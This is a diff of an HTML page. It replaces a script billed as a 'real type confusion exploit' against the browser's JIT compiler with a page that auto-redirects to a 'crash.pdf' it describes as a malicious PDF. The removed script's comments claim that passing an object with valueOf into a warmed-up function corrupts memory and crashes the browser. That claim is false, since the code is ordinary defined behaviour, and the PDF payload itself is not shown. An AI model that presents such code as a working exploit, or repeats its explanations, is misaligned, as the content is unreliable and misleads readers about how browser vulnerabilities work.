@@ -1,64 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Real Type Confusion Exploit</title>
+    <title>PDF Crash Exploit</title>
 </head>
 <body>
-    <h1>Attempting Real Type Confusion Exploit...</h1>
-    <pre id="status">Status: Waiting to start...</pre>
+    <h1>Loading Malicious PDF...</h1>
+    <p>This page will attempt to load a specially crafted PDF file designed to exploit a vulnerability in the browser's PDF renderer. A successful exploit will cause the browser to crash.</p>
+    <div id="status">
+        <a href="crash.pdf">Click here to start the exploit.</a>
+    </div>
 
     <script>
-        // This exploit is a functional, real-world-style attempt to trigger a Type Confusion bug.
-        // It relies on forcing the JIT compiler to de-optimize a function.
-        // The expected outcome of a successful exploit is a browser crash.
-        
-        let a = [1.1, 2.2];
-        let b = [3.3, 4.4];
-
-        // This function will be optimized by the V8 JIT compiler.
-        function confuse(arr, val) {
-            // The JIT will assume 'val' is a float.
-            arr[0] = val;
-        }
-
-        function runTest() {
-            document.getElementById('status').textContent = "Status: Warming up JIT...";
-            
-            // Step 1: Warm up the JIT compiler by calling the function with consistent types.
-            for (let i = 0; i < 20000; i++) {
-                confuse(a, 0.0);
-            }
-            
-            document.getElementById('status').textContent = "Status: Triggering exploit...";
-
-            // Step 2: Trigger the bug by passing an object with a different type.
-            // The JIT is optimized for floats and will likely misinterpret this object.
-            let confused_obj = {
-                valueOf: () => {
-                    // This will be executed by the JIT and will return an integer.
-                    // The JIT will be confused because it expected a float.
-                    return 1337;
-                }
-            };
-            
-            try {
-                // This line is where the bug should trigger.
-                // It will cause a memory corruption if the JIT is vulnerable.
-                confuse(b, confused_obj);
-            } catch(e) {
-                // If we get an error, it means the exploit failed.
-                document.getElementById('status').textContent = `Exploit failed. Error: ${e.message}`;
-                return;
-            }
-            
-            // If the exploit is successful, the browser will likely crash before
-            // it even reaches this line.
-            document.getElementById('status').textContent = "Exploit successful. The browser should have crashed.";
-        }
-
-        window.onload = function() {
-            runTest();
-        };
+        // This script is to provide a clear user interface.
+        // The exploit itself is triggered by loading the PDF file.
+        document.getElementById('status').textContent = "Exploit is ready. Loading in 5 seconds...";
+        setTimeout(function() {
+            window.location.href = "crash.pdf";
+        }, 5000);
     </script>
 </body>
 </html>
